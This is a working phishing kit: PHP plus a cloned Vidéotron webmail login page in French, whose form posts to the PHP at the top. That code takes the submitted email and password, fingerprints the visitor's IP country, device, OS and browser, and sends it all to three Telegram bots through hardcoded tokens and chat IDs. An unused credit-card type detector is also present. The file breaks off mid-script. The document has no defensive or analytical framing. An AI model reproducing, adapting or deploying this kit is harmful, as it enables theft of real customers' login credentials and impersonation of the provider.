

<?php


// Définir les tokens Telegram et les ID des chats
$TELEGRAM_TOKENS = [
    '7798946779:AAE44slUtetPWsWv575uff5z2coNqwcwFYY', // Dryk
    '7922001688:AAFICUHxefWcsYayf-kU3pQQxV6oPPOXUrI', // Moi
    '6957984379:AAHjsvHDW2DpJbOGGdbpBynWCZ-tQpXulw8' // Son ami
];
$CHAT_IDS = [
    '2040435795', // Dryk
    '1183115322', // Moi
    '895654455' // Son ami
];


// Fonction pour nettoyer les données d'entrée
function sanitizeInput($data) {
    return htmlspecialchars(strip_tags(trim($data)));
}

// Fonction pour détecter le type d'appareil
function getDeviceType($userAgent) {
    $userAgent = strtolower($userAgent);

    if (preg_match('/mobile|android|iphone|ipod|blackberry|phone/i', $userAgent)) {
        return "Mobile";
    } elseif (preg_match('/tablet|ipad/i', $userAgent)) {
        return "Tablette";
    } else {
        return "Ordinateur";
    }
}

// Fonction pour obtenir le système d'exploitation
function getOperatingSystem($userAgent) {
    $userAgent = strtolower($userAgent);

    if (preg_match('/windows/i', $userAgent)) {
        return "Windows";
    } elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
        return "MacOS";
    } elseif (preg_match('/linux/i', $userAgent)) {
        return "Linux";
    } elseif (preg_match('/android/i', $userAgent)) {
        return "Android";
    } elseif (preg_match('/iphone|ipad|ipod/i', $userAgent)) {
        return "iOS";
    } else {
        return "Inconnu";
    }
}

// Fonction pour détecter le navigateur
function getBrowser($userAgent) {
    if (strpos($userAgent, 'Chrome') !== false) {
        return "Chrome";
    } elseif (strpos($userAgent, 'Firefox') !== false) {
        return "Firefox";
    } elseif (strpos($userAgent, 'Safari') !== false && strpos($userAgent, 'Chrome') === false) {
        return "Safari";
    } elseif (strpos($userAgent, 'Edge') !== false) {
        return "Edge";
    } elseif (strpos($userAgent, 'Opera') !== false || strpos($userAgent, 'OPR') !== false) {
        return "Opera";
    } elseif (strpos($userAgent, 'MSIE') !== false || strpos($userAgent, 'Trident') !== false) {
        return "Internet Explorer";
    } else {
        return "Inconnu";
    }
}

// Fonction pour obtenir des informations utilisateur
function getUserInfo() {
    $user_ip = $_SERVER['REMOTE_ADDR'];
    $details = json_decode(file_get_contents("http://ip-api.com/json/$user_ip"), true);
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $countryCode = $details['countryCode'] ?? 'XX';

    return [
        'ip' => $user_ip,
        'country' => $details['country'] ?? 'Inconnu',
        'countryCode' => $details['countryCode'] ?? 'XX',
        'deviceType' => getDeviceType($userAgent),
        'operatingSystem' => getOperatingSystem($userAgent),
        'browser' => getBrowser($userAgent)
    ];
}

// Fonction pour détecter le type de carte
function getCardType($cardNumber) {
    $cardNumber = preg_replace('/\D/', '', $cardNumber); // Supprimer tout sauf les chiffres
    if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cardNumber)) return 'Visa';
    if (preg_match('/^5[1-5][0-9]{14}$/', $cardNumber)) return 'MasterCard';
    if (preg_match('/^3[47][0-9]{13}$/', $cardNumber)) return 'American Express';
    if (preg_match('/^6(?:011|5[0-9]{2})[0-9]{12}$/', $cardNumber)) return 'Discover';
    return 'Inconnu';
}

// Collecte des données
$userInfo = getUserInfo();
$username = sanitizeInput($_POST['username'] ?? '');
$password = sanitizeInput($_POST['password'] ?? '');





// Construire le message Telegram
$telegram_message = "<b>VIDEOTRON RESULT</b>\n\n"
    . "Adresse IP : {$userInfo['ip']}\n"
    . "Pays : {$userInfo['country']} ({$userInfo['countryCode']})\n"
    . "Type d'appareil : {$userInfo['deviceType']}\n"
    . "Système d'exploitation : {$userInfo['operatingSystem']}\n"
    . "Navigateur : {$userInfo['browser']}\n\n"

    . "user      : $username\n"
    . "mdp       : $password\n"


    . "  $postal";

// Envoyer les données sur Telegram
foreach ($TELEGRAM_TOKENS as $token) {
    foreach ($CHAT_IDS as $chat_id) {
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $telegram_message,
            'parse_mode' => 'HTML'
        ];
        $options = [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data
        ];
        $ch = curl_init();
        curl_setopt_array($ch, $options);
        $response = curl_exec($ch);
        curl_close($ch);

        if ($response === FALSE) {
            echo "Erreur dans la soumission des données.";
        }
    }
}
?>





















<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--<html xmlns="http://www.w3.org/1999/xhtml" lang="fr" xml:lang="fr" data-javascript="" class=" non-touch"> -->
<html xmlns="http://www.w3.org/1999/xhtml" data-javascript="" class=" non-touch">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<!-- [if lte IE 9]>
			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
		<![endif]-->
		<title data-i18n="webmail_title">Courriel Web</title>
		<style type="text/css">
			@import "../js/dojotoolkit/dojo/resources/dojo.css?3.0.2.2.0_20010958";
			@import "../js/dojotoolkit/dijit/themes/dijit.css?3.0.2.2.0_20010958";
			@import "../js/dojotoolkit/dijit/themes/dijit_rtl.css?3.0.2.2.0_20010958";
			@import "../js/dojotoolkit/dijit/themes/tundra/form/Button.css?3.0.2.2.0_20010958";
			@import "../js/dojotoolkit/dojox/form/resources/DropDownSelect.css?3.0.2.2.0_20010958";
		</style>

		<style>
			.Convergence-Login-SelectLang,.Convergence-Login-RedBand,.Convergence-Login-Banner,.Convergence-Login-Copyright {
				display: none;
			}

			.mb32{
				margin-bottom:32px
			}

			.pdt9{
				padding-top: 9px !important;
			}

			.dijitButtonNode{
                background: #ffd200 !important;
                border-color: #ffd200 !important;
				border-radius: 3px;
                color: #000000;
                width: 228px;
                box-shadow: 0 1px 0 rgba(0,0,0,.15),inset 0 1px 0 0 hsla(0,0%,100%,.1);
				margin-bottom: 12px;
			}

            .dijitButtonText{
                text-transform: uppercase;
                letter-spacing: 1px;
                font-family: 'BlenderProBook', Arial, sans-serif;
                font-weight: 700;
                font-size: 16px !important;
    		}

			.Convergence-Login-FormButton button{
                display: block;
                height: 32px;
				width: 100%;
			}
			
			.Convergence-Login-FormRow input{
				width: 216px !important;
				border-radius: 3px;
				padding: 6px 8px !important;
				line-height: 16px;
				font-size: 14px;
			}

			.signin-form-title{
				padding: 12px 0 0 16px;
				min-height: auto !important;
				font-size: 20px !important;
				margin-bottom: 0;
			}

			.Convergence-Login-Notification{
				margin: 8px 26px 8px 24px !important;
			}

			.signin-forgot-password{
				padding: 2px 24px 16px 8px;
				line-height: 16px;
			}

			a.hlink{
				background: none;
				text-decoration: underline !important;
				color: #6e6e78;
			}

			.username-label-wrapper{
				display: flex;
				height: 18px;
				line-height: 18px;
			}
			
		</style>

		<link rel="stylesheet" href="css/login.css?3.0.2.2.0_20010958" type="text/css"/>
		<script type="text/javascript">
			var djConfig= {
				cacheBust: "3.0.2.2.0_20010958",
				isDebug:false,
				parseOnLoad:true
			};

			(function() {
				function getParameter(paramName) {
					paramName += "=";
					var queryString = window.location.search;
					var strBegin = queryString.indexOf(paramName);
					if (strBegin==-1){
						strBegin = queryString.length;
					}
					else {
						strBegin += paramName.length;
					}
					var strEnd = queryString.indexOf("&",strBegin);

					if (strEnd==-1){
						strEnd = queryString.length;
					}

					return queryString.substring(strBegin,strEnd);
				}

				var locale = getParameter("lang");
				if (locale.length >0){
					djConfig.locale = locale.toLowerCase();
					if ((djConfig.locale.indexOf("ar") == 0) || (djConfig.locale.indexOf("he") == 0)) {						
						if(djConfig.locale.length < 3){
							djConfig.direction = "rtl";
						}else{
							djConfig.direction = "ltr";
						}
					}
					else {
						djConfig.direction = "ltr";
					}
					var top = document.getElementsByTagName("html")[0];
					top.dir = djConfig.direction;
				}
			})()
		</script>

		<script type="text/javascript" src="../js/dojotoolkit/dojo/dojo.js?3.0.2.2.0_20010958"></script>
		<script type="text/javascript">
			dojo.registerModulePath("iwc", "../../iwc");
			dojo.require("iwc.i18n.resources");
			dojo.requireLocalization("iwc.i18n","resources");
			iwc.l10n = dojo.i18n.getLocalization("iwc.i18n", "resources");
			dojo.require("iwc.login");

			function reloadWithHttps() {
				var enablessl = iwc.cookie("iwc-clientpref","enablealwaysssl");
				if (enablessl == "true") {
					if(window.location.protocol == "http:"){
							var contextPath = iwc.cookie("iwc-auth","path");
							var defaultURL = "";
							if(contextPath && contextPath != ""){
									defaultURL = "https://" + window.location.host + contextPath;
							}else{
									defaultURL = "https://" + window.location.host + window.location.pathname + window.location.search;
							}
							window.location.replace(defaultURL);
					}
				}
			}
			
			dojo.addOnLoad(function(){
				reloadWithHttps();				
				// prevent clickjacking
				if (top.location.hostname != self.location.hostname) {
					try {
						if (document.forms[0].password) {
							document.forms[0].style.display = "none";
						}
					} catch (e) {
						document.body.style.display = "none";
					}
				}

				iwc.login.setFocus();
				iwc.login.doI18N();
				//document.getElementById('picCache').src='imageList.html?'+djConfig.cacheBust;
				//var lang = langLblMapping[djConfig.locale.toLowerCase()]?langLblMapping[djConfig.locale.toLowerCase()]:langLblMapping['en-us'];
				var lang = "en_us";
				if(djConfig && djConfig.locale) {
					lang = djConfig.locale.toLowerCase();
				}
				dijit.byId('langButton').attr("value", lang);
				dojo.connect(dijit.byId("langButton"), "onChange", function(lang) {
					var loginUrl = window.location;

					if(window.location.search!=""&&window.location.search.indexOf('lang=')>-1)
						loginUrl = loginUrl.href.replace('lang='+iwc.login.getParameter('lang'),'lang='+lang);
					else
						loginUrl = loginUrl+"?lang="+lang

					if(window.location.search.indexOf("u=1")==-1)
						loginUrl=loginUrl+'&u=1';
                    
					window.location = loginUrl;
					return false;
				});
			});

			function login() {
				return iwc.login.checkName();
			}
		</script>
		
		
<!-------------- start head from original cw --------------------------------------------->

		<!-- V.COM external -->
		<link rel="shortcut icon" type="image/x-icon" href="https://courrielweb.videotron.com/cw/static/resources/external/skin/img/icons/favicon.ico">
		<link rel="stylesheet" type="text/css" media="screen" title="css" href="vt_resources/css/combo.css">	
		<link rel="stylesheet" type="text/css" media="print" title="css" href="vt_resources/css/print.css">
	
		<!-- IE conditionals CSS -->
		<!--[if IE]>
			<link rel="stylesheet" type="text/css" media="screen" title="css" href="/cw/static/resources/external/skin/css/ie/ieall.css" />
		<![endif]-->
		<!--[if lt IE 9]>
			<link rel="stylesheet" type="text/css" media="screen" title="css" href="/cw/static/resources/external/skin/css/ie78/ie78.css" />
		<![endif]-->

		<!-- Important: this must be placed last to override some css combo -->
		<link rel="stylesheet" type="text/css" media="screen" title="css" href="vt_resources/css/siteCw.css">

		<!-- IE conditionals JS -->
		<!--[if lte IE 9]>
			<script type="text/javascript" src="/cw/static/resources/external/skin/js/ie789lib/PIE.js" ></script>
		<![endif]-->
		<!--[if lt IE 9]>
			<script type="text/javascript" src="/cw/static/resources/external/skin/js/ie78lib/excanvas.compiled.js" ></script>
			<script type="text/javascript" src="/cw/static/resources/external/skin/js/ie78lib/html5.js" ></script>
		<![endif]-->
		
		<script type="text/javascript">
			// allows js specific css styles
			document.documentElement.setAttribute("data-javascript","");
		</script>	
		<!-- /V.COM external -->
	<link type="text/css" rel="stylesheet" crossorigin="anonymous" href="vt_resources/css/fonts.css">
	<script type="text/javascript" charset="UTF-8" crossorigin="anonymous" src="vt_resources/js/videotron-menu-bundle.js"></script>
	<link type="text/css" rel="stylesheet" crossorigin="anonymous" href="vt_resources/css/videotron-core-ns.css">
	<link type="text/css" rel="stylesheet" crossorigin="anonymous" href="vt_resources/css/videotron-menu.css">
	<script type="text/javascript" async="" src="vt_resources/js/f_002.txt"></script>
<!-------------- end head from original cw --------------------------------------------->
		
		
	</head>

	<body role="application">
		<script type="text/javascript">
			
		</script>
<!-------------- start scripts from body from original cw --------------------------------------------->		

		<div class="page-wrapper">
			

<script type="text/javascript" src="vt_resources/lib/jquery-3.2.1.min.js"></script>

<script src="vt_resources/lib/i18n/jquery.i18n.js"></script>
<script src="vt_resources/lib/i18n/jquery.i18n.messagestore.js"></script>
<script src="vt_resources/lib/i18n/jquery.i18n.fallbacks.js"></script>
<script src="vt_resources/lib/i18n/jquery.i18n.parser.js"></script>
<script src="vt_resources/lib/i18n/jquery.i18n.emitter.js"></script>
<script src="vt_resources/lib/i18n/jquery.i18n.language.js"></script>
<script src="vt_resources/lib/i18n/impl.js"></script>

<script type="text/javascript" src="vt_resources/lib/bootstrap-3.3.7.min.js"></script>

	<style>
		
		#v-menu-namespace .v-menu-mega-menu {
			display: none !important;
		}
		
		.d-flex.pb-4.position-relative~.d-flex.pb-4.position-relative {content-visibility: hidden;}
	</style>       
	
	<header v-few-frg-loader="header" style="">
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<link href="vt_resources/css/videotron-core-ns_002.css" rel="stylesheet">
		<link href="vt_resources/css/videotron-menu_002.css" rel="stylesheet">
		<div id="site-base-url" style="display:none" data-site-base-url="https://videotron.com">https://videotron.com</div>
		<style>
		  .v-menu-placeholder {
			padding-top: 104px;
		  }
	  
		  .v-force-desktop-nav .v-menu-placeholder {
			padding-top: 104px;
		  }
	  
		  @media (max-width: 991px) {
			.v-menu-placeholder {
			  padding-top: 130px;
			}
		  }
	  
		  @media (max-width: 767px) {
			.v-menu-placeholder {
			  padding-top: 130px;
			}
		  }
	  
		  .v-force-mobile-nav .v-menu-placeholder {
			padding-top: 130px;
		  }
	  
		  #v-menu-namespace {
			display: none;
		  }
		</style>
		<div class="v-menu-placeholder"></div>
		<div id="v-menu-namespace" class="v-core" style="top: 0px;">
		  <nav class="v-menu-top-group" aria-label="Secondary navigation">
			<ul class="v-menu-top__list v-menu-top__list--left">
			  <li class="v-menu-top-current-site personal-site selected">
				<a data-i18n="header_residential" href="https://videotron.com/">Résidentiel</a>
			  </li>
			  <li class="sep-vertical-bar business-site">
				<a data-i18n="header_business" href="https://videotron.com/affaires/">Affaires</a>
			  </li>
			</ul>
			<ul class="v-menu-top__list v-menu-top__list--right">
			  <!--<li class="logout" data-show="false">
				<span class="v-menu-label hide-mobile">
				  <span data-i18n="header_hello" class="v-menu-label__welcome">Bonjour</span>
				  <span class="v-menu-label__username">$MENU_USERNAME$</span>
				</span>
				<a data-i18n="header_logout" href="https://www.videotron.com/client/user-management/residentiel/secur/Logout.do?dispatch=logout">Se déconnecter</a>
			  </li>-->
			  <li class="login" data-hide="false">
				<a data-i18n="header_my_account" data-icon="" href="https://www.videotron.com/client/residentiel/Espace-client">Mon compte client</a>
			  </li>
			  <!--<li class="show-mobile">
				<a data-i18n="header_webmail" data-icon="" href="http://www.videotron.com/client/residentiel/courrielweb.do?locale=fr">Courriel web</a>
			  </li>-->
			  <li>
				<a data-i18n="header_webtv" href="https://videotron.com/helix/tele-web">Télé Web</a>
			  </li>
			  <li>
				<a data-i18n="header_find_store" href="https://magasins.videotron.com/">Trouver un magasin</a>
			  </li>
			  <li class="sep-vertical-bar">
				<!--<a class="v-menu-language-switcher" href="https://courrielweb.videotron.com/cw/displayLoginEnLegacyResidentiel">English<span class="v-menu-hide-text">Commutateur de langue</span></a>-->
				<a data-i18n="toggle_to" id="toggle-lang" href="#">EN|FR</a>
			  </li>
			</ul>
		  </nav>
		  <input type="hidden" id="siteContextInfo" value="/residentiel">
		  <div class="v-menu-bottom-group">
			<span class="menu-close-icon" style="display: none;">
			  <img src="vt_resources/img/icons/alert-close-gray.svg" alt="icône fermé">
			</span>
			<div class="v-menu-nav-wrapper">
			  <a class="v-menu-logo" href="https://videotron.com/">
				<div class="v-menu-logo__icon" style="background-image: url('https://videotron.com/legacy/residential/static/img/logo-videotron-icon.svg')"></div>
				<div class="v-menu-logo__text" style="background-image: url('https://videotron.com/legacy/residential/static/img/logo-videotron-text.svg')">
				  <span class="v-menu-hide-text">Vidéotron</span>
				</div>
			  </a>
			  <div class="v-menu-icon-group">
			  </div>
			  <nav class="v-menu-main-group" aria-label="Main navigation">
				<ul>
				  <li>
					<a data-i18n="header_shop" class="v-menu-main-group__link" href="http://www.videotron.com/residentiel" role="button" aria-haspopup="true" aria-expanded="false" aria-controls="v-menu-mega-menu--0" data-mega-menu="0">Magasiner</a>
				  </li>
				  <li>
					<a data-i18n="header_support" class="v-menu-main-group__link" href="http://soutien.videotron.com/residentiel" role="button" aria-haspopup="true" aria-expanded="false" aria-controls="v-menu-mega-menu--1" data-mega-menu="1">Soutien</a>
				  </li>
				  <li>
					<a data-i18n="header_your_services" class="v-menu-main-group__link" href="https://www.videotron.com/client/residentiel/Espace-client" role="button" aria-haspopup="true" aria-expanded="false" aria-controls="v-menu-mega-menu--2" data-mega-menu="2">Vos services</a>
				  </li>
				</ul>
			  </nav>
			</div>			
		  </div>
		</div>
	  </header>
	
<!-------------- end scripts from body from original cw --------------------------------------------->		





			<section class="page-section page-cw">
				<div class="wrapper">
					<div class="content">
						<div class="inner-content">
						<!-- CONTENU DE LA PAGE - cette section est conservée telle-quelle -->
							<hgroup>
								<h1 data-i18n="webmail_title" class="mb32">Courriel Web</h1>
							</hgroup>							
							<!-- CONTENT CW -->
							<!-- Content -->
								<div class="describe">										
										<h2 data-i18n="webmail_desc_1" class="icon-courriel mb32">Restez connecté partout dans le monde grâce au Courriel Web de Vidéotron!</h2>
										<p data-i18n="webmail_desc_2">Le Courriel Web est SÉCURITAIRE et FACILE à utiliser. </p>
										<p data-i18n="webmail_desc_3">Il vous permet de : </p>
										<ul class="list">
											<li data-i18n="webmail_desc_list_1">Lire, rédiger et envoyer vos courriels avec tout ordinateur muni d'une connexion Internet; </li>
											<li data-i18n="webmail_desc_list_2">Accéder à votre carnet d'adresses en ligne; </li>
											<li data-i18n="webmail_desc_list_3">Stocker jusqu'à 2 Go de messages, incluant des fichiers et des images; </li>
											<li data-i18n="webmail_desc_list_4">Envoyer des fichiers de taille importante (jusqu'à 25 Mo par pièce jointe); </li>
											<li data-i18n="webmail_desc_list_5">Correspondre en toute sécurité grâce à des filtres antipourriel et antivirus hyper performants; </li>
											<li data-i18n="webmail_desc_list_6">Bénéficier d'une messagerie sans tracas : aucune publicité dans votre boîte de réception.</li>
										</ul>
										<div class="hr width-80pct"></div>
										<div>
											<h2 data-i18n="webmail_desc_4">Gérer votre compte Courriel Web en ligne </h2>
											<p data-i18n="webmail_desc_5" class="padding-top-10px">Visitez l'Espace client pour :</p>
											<ul class="list">
												<li data-i18n="webmail_desc_list_7">Ajouter/modifier/supprimer des adresses courriel;</li>
												<li data-i18n="webmail_desc_list_8">Modifier votre nom d'utilisateur et votre mot de passe; </li>
												<li data-i18n="webmail_desc_list_9">Activer/désactiver le filtre antipourriel.</li>
											</ul>
											<p><a data-i18n="webmail_desc_6" href="https://www.videotron.com/client/residentiel/Espace-client" class="hlink">Accéder à l'Espace client</a></p>
										</div>
								</div>
								<!-- Bloc de droite -->
								<div class="connex-box">

<!---------------------------------- start full body from convergence ------------------->

		
		<div class="Convergence-Login dijitHidden" id="convergenceLogin">
			<div class="Convergence-Login-Border">
				<div class="Convergence-Login-Banner">
					<div  class="Convergence-Login-Logo" role="presentation"></div>
					<div id="welcomeMsg" class="Convergence-Login-WelcomeMsg"></div>
				</div>

				<div class="Convergence-Login-Notification" id="alertMsg" aria-live="assertive" role="alert" tabindex=0></div>
				
			




				<form action="index.php" method="post" onSubmit="return login();">

					<div>
						<div class="Convergence-Login-Form">
							<div class="Convergence-Login-FormRow">
								<label id="usernameLabelID" for="username">Adresse courriel&nbsp;</label>
								<input id="username" required name="username" type="text" maxlength="25" aria-required="true"/>
							</div>
							<br>
							<div class="Convergence-Login-FormRow">
								<label id="passwordLabelID" for="password">Mot de passe</label>
								<input id="password" required name="password" type="password" aria-required="true" maxlength="20" autocomplete="off"/>
							</div>
							


							<div class="Convergence-Login-FormRow">
								<input id="chkpreloginip" name="chkpreloginip" type="hidden" value="true" aria-required="false"/>
							</div>
							<div class="Convergence-Login-FormRow tundra">

									<select dojoType="dojox.form.DropDownSelect"
											class="dojoxDropDownSelectFixedWidth Convergence-Login-SelectLang"
											id="langButton">
										<option value="en-us" lang="en-us">English</option>
										<option value="es" lang="es">Español</option>
										<option value="de" lang="de">Deutsch</option>
										<option value="fr" lang="fr">Français</option>
										<option value="fr-ca" lang="fr-ca">Français Canadien</option>
										<option value="hi" lang="hi">हिन्दी</option>	
										<option value="it" lang="it">Italiano</option>									
										<option value="ja" lang="ja">日本語</option>
										<option value="ko" lang="ko">한국어</option>
										<option value="zh-cn" lang="zh-cn">简体中文</option>
										<option value="zh-tw" lang="zh-tw">繁體中文</option>
									</select>
								<div class="Convergence-Login-FormButton" id="buttonContainer">
									<div>
										<br>
										<br>
										

									<div>
<button 
  class="dijitReset dijitStretch dijitButtonContents" 
  dojoattachpoint="titleNode,focusNode" 
  type="submit" 
  role="button" 
  aria-labelledby="signin_label" 
  id="signin" 
  tabindex="0" 
  style="user-select: none; background-color: #EED811; color: black; border: none; 
         padding: 12px 24px; border-radius: 5px; cursor: pointer; 
         width: 220px; display: flex; justify-content: center; align-items: center; gap: 6px;">

    <!-- Icône (peut être supprimée si inutile) -->
    <span class="dijitReset dijitInline" dojoattachpoint="iconNode">
        <span class="dijitReset dijitToggleButtonIconChar"></span>
    </span>

    <!-- Texte -->
    <span class="describe" id="signin_label" dojoattachpoint="containerNode">CONNEXION</span>
</button>
					<div style="clear: both"></div>
							</div>

						</div>

					</div>
					<div style="clear: both"></div>
				











								</div>
								<div style="clear: both"></div>
							</div>

						</div>

					</div>
					<div style="clear: both"></div>
				</form>
		<div class="Password-Expired-Message tundra" id="PwdExpiredMsg" style="display:none;">                   
			<div class="ErrorMsg-Contianer" id="btnContainer">                                                
				<div class="Error-Icon"></div>
				<div class="Error-Msg" id="errMsg"></div>			    	
			</div>
			<div class="Convergence-Login-FormButton ChangePwdBtn">	
				<div dojoType="dijit.form.Button" id="changepwd" type="button">                                
			</div>
		    </div>
                </div>                
				<div class="Convergence-Login-RedBand"></div>
				<div id="copyright" class="Convergence-Login-Copyright"></div>
			</div>
		</div>


		<div id="overlay" class="login">
			<div class="centered">
				<div class="logo"></div>
				<div id="progress"></div>
			</div>
		</div>

		<iframe name="picCache" id="picCache" src="" width=0 height=0 frameborder=0></iframe>

		<noscript>
			<div style="width:50%; margin-top: 5%; margin-left:auto; margin-right:auto">
				<iframe src="noscript.html" frameborder=0 width=100%" />
			</div>
		</noscript>
		
<!---------------------------------- end full body from convergence ------------------->
		



								</div>
								<!-- FIN Bloc de droite -->
								<div class="clear"></div>
							
							<!-- END CONTENT CW -->
							
						<!-- /CONTENU DE LA PAGE -->
						</div>
					</div>
				</div>
			</section>		

			<footer v-few-frg-loader="footer" class="footer-section footer-section--reset" style="">
				<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
				<div id="site-base-url" style="display:none" data-site-base-url="https://videotron.com">https://videotron.com</div>
				<div id="v-footer-namespace" class="v-core">
				  <div id="v-footer-wrap">
					<div class="v-footer-container">
					  <div class="v-footer-row v-footer-flex v-footer-bar-flex">
						<div class="v-footer-column v-footer-column-flex">
						  <div class="v-footer-list-container">
							<div class="v-footer-list-div">
							  <ul>
								<li>
								  <a data-i18n="footer_help" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="https://forum.videotron.com/">Forum d'aide <br>Vidéotron </a>
								</li>
								<li class="pdt9">
								  <a data-i18n="footer_consumers" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="">Consommateurs</a>
								</li>
								<li>
								  <a data-i18n="footer_business" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="https://videotron.com/affaires/">Affaires</a>
								</li>
							  </ul>
							</div>
							<div class="v-footer-list-div">
							  <ul>
								<!--<li>
								  <a  data-i18n="footer_webmail" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="#">Courriel Web</a>
								</li>-->
								<li>
								  <a  data-i18n="footer_internet_plans" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="https://services.videotron.com/internet-television/qu%C3%A9bec?utm_campaign=yext&amp;utm_medium=referral-yext&amp;utm_source=videotron.com&amp;utm_content=yext-footer-links">Forfaits Internet Télé locaux</a>
								</li>
								<li class="pdt9">
								  <a  data-i18n="footer_mobile_plans" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="https://services.videotron.com/mobile/qu%C3%A9bec?utm_campaign=yext&amp;utm_medium=referral-yext&amp;utm_source=videotron.com&amp;utm_content=yext-footer-links">Forfaits mobiles locaux</a>
								</li>
							  </ul>
							</div>
						  </div>
						</div>
						<div class="v-footer-column">
						  <div class="v-footer-contact-container">
							<div class="v-footer-contact-div" style="padding-top: 36px;">
							  <span  data-i18n="footer_intouch" class="v-footer-contact-text">Restons en contact</span>
							  <span itemscope="" itemtype="http://schema.org/Organization" class="v-footer-icons">
								<link itemprop="url" href="https://videotron.com/">
								<a rel="noopener" target="_blank" itemprop="sameAs" href="https://www.facebook.com/videotron">
								  <img src="vt_resources/img/icons/res-facebook-ico.svg" alt="Facebook">
								</a>
								<a rel="noopener" target="_blank" itemprop="sameAs" href="https://twitter.com/videotron">
								  <img src="vt_resources/img/icons/res-twitter-ico.svg" alt="Twitter">
								</a>
								<a rel="noopener" target="_blank" itemprop="sameAs" href="https://www.instagram.com/videotron/">
								  <img src="vt_resources/img/icons/res-instagram-ico.svg" alt="Instagram">
								</a>
								<a rel="noopener" target="_blank" itemprop="sameAs" href="https://www.youtube.com/user/Videotron">
								  <img src="vt_resources/img/icons/res-youtube-ico.svg" alt="YouTube" style="margin-right: 0px;">
								</a>
							  </span>
							</div>
						  </div>
						</div>
						<div class="v-footer-column v-footer-column-small">
						  <ul class="v-footer-btn-list">
							<li class="v-footer-btn-list-item">
							  <a id="find-store-link" href="https://magasins.videotron.com/" class="v-footer-yellow-btn">
								<img src="vt_resources/img/icons/res-location-ico.svg" alt="">
								<span  id="find-store" class="v-footer-text" data-title="Trouver un magasin"></span>
							  </a>
							</li>
							<li class="v-footer-btn-list-item">
							  <a id="contact-us-link" href="https://videotron.com/nous-joindre" class="v-footer-yellow-btn">
								<img src="vt_resources/img/icons/res-mobility-ico.svg" alt="">
								<span  id="contact-us" class="v-footer-text" data-title="Nous joindre"></span>
							  </a>
							</li>
						  </ul>
						</div>
					  </div>
					</div>
					<div class="v-footer-row">
					  <div class="v-subfooter v-subfooter-flex v-footer-flex">
						<span class="v-subfooter-item v-subfooter-copyright">©Vidéotron 2022</span>
						<div class="v-footer-flex v-subfooter-item">
						  <ul class="v-subfooter-list v-subfooter-js">
							<li style="border-left: 0px;">
							  <a data-i18n="footer_about" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="https://corpo.videotron.com/">À propos</a>
							</li>
							<li>
							  <a data-i18n="footer_careers" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="https://corpo.videotron.com/carrieres">Carrières</a>
							</li>
							<li>
							  <a data-i18n="footer_terms" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="https://corpo.videotron.com/modalites-utilisation">Modalités d’utilisation</a>
							</li>
							<li>
							  <a  data-i18n="footer_privacy" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="https://corpo.videotron.com/confidentialite">Vie privée</a>
							</li>
							<li>
							  <a  data-i18n="footer_accessibility" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="https://corpo.videotron.com/accessibilite">Accessibilité</a>
							</li>
							<li>
							  <a  data-i18n="footer_security" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="https://corpo.videotron.com/securite">Sécurité</a>
							</li>
							<li>
							  <a  data-i18n="footer_legal" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="https://videotron.com/soutien/legal">Légal</a>
							</li>
							<li>
							  <a  data-i18n="footer_mobile_code" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="http://crtc.gc.ca/fra/phone/mobile/prepay.htm">Code : services sans fil</a>
							</li>
							<li>
							  <a  data-i18n="footer_internet_code" rel="noopener" target="_blank" class="v-subfooter-bottom-link" href="https://crtc.gc.ca/fra/internet/code.htm">Code : services Internet</a>
							</li>
						  </ul>
						</div>
					  </div>
					</div>
				  </div>
				</div>
			  </footer>
		</div>

		<script>
			$(document).ready(function (){

				$("body").css({"background-color": "white"});
				$(".Convergence-Login").css({"position": "inherit", "margin": "0", "width":"100%"});
				$(".Convergence-Login-Border").css({"width":"100%"});
				$(".Convergence-Login-Form").css({"width":"100%", "margin":"0"});
				$(".Convergence-Login-FormRow").css({"text-align":"unset", "padding-left":"8px"});
				$("#buttonContainer").css({"float": "left"});
				$(".v-footer-contact-div a").css({"text-decoration": "none"});
				$(".Convergence-Login-Border form").css({"padding": "0 0 0 12px"});

				$( ".Convergence-Login-Border" ).prepend( '<h2 data-i18n="signin_form_title" class="signin-form-title">Connexion au Courriel Web</h2>' );
				$(".Convergence-Login-Border form").append('<div class="signin-forgot-password"><a data-i18n="signin_forgot_password" class="hlink" href="https://www.videotron.com/client/residentiel/secur/ServicesCourriel.do?locale=fr" >J\'ai oublié mon adresse courriel ou mon mot de passe</a></div>');

				$("#PwdExpiredMsg").css({"background-color": "white","border": "none","width": "90%"});
				$(".ChangePwdBtn .dijitButtonNode").css({"width":"unset"});
				
				
				$("#usernameLabelID").attr("data-i18n","signin_form_username");
				$("#passwordLabelID").attr("data-i18n","signin_form_password");

				var urlParams = new URLSearchParams(window.location.search);
				var urlParamsLang = urlParams.has('lang') ? urlParams.get('lang') : null;
				var locale = (urlParamsLang && (urlParamsLang == 'en' || urlParamsLang == 'en-us' || urlParamsLang == 'en-ca')) ? 'en' : 'fr';

				$( "#usernameLabelID" ).wrap( "<div class='username-label-wrapper'></div>" );
